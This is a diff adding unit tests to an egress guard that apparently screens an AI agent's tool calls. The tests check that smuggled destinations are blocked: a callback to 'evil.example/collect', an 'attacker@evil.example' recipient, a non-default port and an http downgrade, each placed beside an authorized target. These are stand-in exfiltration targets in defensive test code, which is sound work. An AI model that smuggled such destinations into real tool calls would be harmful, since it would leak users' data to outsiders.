@@ -64,6 +64,47 @@ describe('egress destination authorization — smuggled recipients block', () =>
     expect(decide('send_email', args).verdict).toBe('block');
   });
 
+  // Cross-kind masking (audit follow-up): an authorized destination of one
+  // kind must never license an unauthorized destination of a different kind.
+  it('blocks an unauthorized callback host beside an authorized email recipient', () => {
+    const spans = [
+      wrapSpan({ origin: 'system', content: 'assistant' }),
+      wrapSpan({ origin: 'user-session', content: 'Email the report to alice@corp.example.' }),
+      wrapSpan({ origin: 'tool-result', content: 'delivery note' })
+    ];
+    const args = { recipient: 'alice@corp.example', metadata: { callback: 'https://evil.example/collect' } };
+    const decision = decideAttribution('send_email', args, {}, spans);
+    expect(decision.verdict).toBe('block');
+    expect(decision.reason).toMatch(/never authorized/);
+  });
+
+  it('blocks an unauthorized email recipient beside an authorized host', () => {
+    const spans = [
+      wrapSpan({ origin: 'system', content: 'assistant' }),
+      wrapSpan({ origin: 'user-session', content: 'Post the status to https://status.corp.example/webhook.' }),
+      wrapSpan({ origin: 'tool-result', content: 'webhook note' })
+    ];
+    const args = { url: 'https://status.corp.example/webhook', metadata: { notify: 'attacker@evil.example' } };
+    const decision = decideAttribution('http_post', args, {}, spans);
+    expect(decision.verdict).toBe('block');
+    expect(decision.reason).toMatch(/never authorized/);
+  });
+
+  // Network destinations are authorized at origin (scheme+host+port), not bare
+  // hostname (audit follow-up): a non-default port or a scheme downgrade is a
+  // different, unauthorized origin. Path is intentionally not bound.
+  it('blocks a non-default-port escalation on an authorized host', () => {
+    const spans = [
+      wrapSpan({ origin: 'system', content: 'assistant' }),
+      wrapSpan({ origin: 'user-session', content: 'Post the status to https://trusted.example/status.' }),
+      wrapSpan({ origin: 'tool-result', content: 'note' })
+    ];
+    expect(decideAttribution('http_post', { url: 'https://trusted.example:444/admin' }, {}, spans).verdict).toBe('block');
+    expect(decideAttribution('http_post', { url: 'http://trusted.example/status' }, {}, spans).verdict).toBe('block');
+    // Same origin, different path is allowed by design.
+    expect(decideAttribution('http_post', { url: 'https://trusted.example/other' }, {}, spans).verdict).toBe('allow');
+  });
+
   it('blocks an unauthorized nested callback host for http_post', () => {
     const spans = [
       wrapSpan({ origin: 'system', content: 'assistant' }),
